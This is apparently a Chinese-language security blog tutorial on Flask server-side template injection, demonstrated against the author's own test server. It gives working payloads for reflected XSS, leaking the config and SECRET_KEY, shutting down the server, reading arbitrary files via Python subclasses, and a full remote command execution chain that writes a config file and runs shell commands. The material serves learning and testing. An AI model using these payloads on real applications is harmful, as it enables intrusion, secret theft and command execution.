---
layout: post
title: flask-ssti注入
categories: [web]
tags: [web]
fullview: false
comments: true
---

[源代码地址](https://github.com/ZhangAiQiang/Flask/tree/master/flask-session%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0%E7%AE%80%E5%8D%95%E6%BA%90%E7%A0%81)  (请用python2.7运行，python3有点出入)
  
# **注入点:**     

![](https://i.imgur.com/BjpRspN.png)  

不是返回的静态模板而是反回模板字符串变得让客户端可以控制。  
  
# **XSS**   #
  
这里直接  
>     http://39.105.116.195:9000/<script>alert(1)</script>就会有反射性XSS    

<script>alert("震惊")</script>

flask对模板文件和模板文件中内容进行转义,可如果直接返回模板字符串或者直接返回字符串的话是不会转义的:  


  
![](https://i.imgur.com/AlrT7iT.png)  

只有xss1不会弹框，因为传到了静态文件里面，flask会自动进行转义。  

# **注入测试**   

http://39.105.116.195:9000/{{1+1}}  发现回传的是"/2"存在注入点。  

![](https://i.imgur.com/ls9zH4o.png) 

存在注入。  

# **config** #
 
flask的一个内置全局变量，保存着一些很隐私的信息。  

![](https://i.imgur.com/76P4EX0.png)  

比如SECRET_KEY，就可以session伪造用户。还有数据库连接的信息，就知道了数据库的密码。    



# **request** 
类似于config，保存着一些信息。**request.environ**是一个字典，其中包含和服务器环境相关的对象  

![](https://i.imgur.com/domxsHz.png)  

>     http://39.105.116.195:9000/{{ request.environ['werkzeug.server.shutdown']()}}这个会让服务器停止运行python，但是在gunicorn环境下中不会。  

# **config的from_object方法** #

{{ config.from_object('os') }}通过这个方法，config属性里面多了os(这是举个例子，其他的库自己也可以试试)库里面名字全是大写的属性和变量，而且是可以直接调用。  
  

# **几个重要的属性**  

![](https://i.imgur.com/AZFDkgb.png)  
运行结果  

![](https://i.imgur.com/qVopj2E.png)
  
# **任意文件读取** #
![](https://i.imgur.com/uApeB1u.png)  

>     ""根据__class__是个str类型，根据__mro__(或者__base__)找到object，再由__subclasses__找到object的所有子类，然后调用其中的file属性实现任意文件读取。  



# **远程代码执行利用from_pyfile** #

将一个文件的路径传进去然后编译，这样我们结合file的写功能就可以在指定的位置写文件，然后用from_pyfile编译。    

**写入指令print(1+1)**

![](https://i.imgur.com/wYQ0Skk.png)    
  
**pyfile来编译执行，返回TRUE执行成功。**


![](https://i.imgur.com/udhMvsj.png)  
 
## 还有一种是不用每次写文件，写一次，然后每次只传入命令就好。  

>     http://39.105.116.195:9000/{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\rRUNCMD = check_output') }}   

参考[文章](http://www.anquan.us/static/drops/tips-13683.html)的时候,他是\n\r，可能是mac本，不管了，服务器一般用linux，\n\r写入回车就好了。还有一个需要注意的是，如果你是直接在浏览器上输入反斜杠的话会给你编码为/，所以会编译失败(因为没有回车)，url编码一下就好了%5cn%5cr  
    
>     http://39.105.116.195:9000/{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output%5cn%5crRUNCMD = check_output') }},另外的话如果用burp抓包发送是不需要考虑编码的。

**编译**  

>     {{ config.from_pyfile('/tmp/owned.cfg') }}  

**命令执行:**
  
>     http://39.105.116.195:9000/{{ config['RUNCMD']('ls /',shell=True)}}  

  
![](https://i.imgur.com/i5R1Iod.png)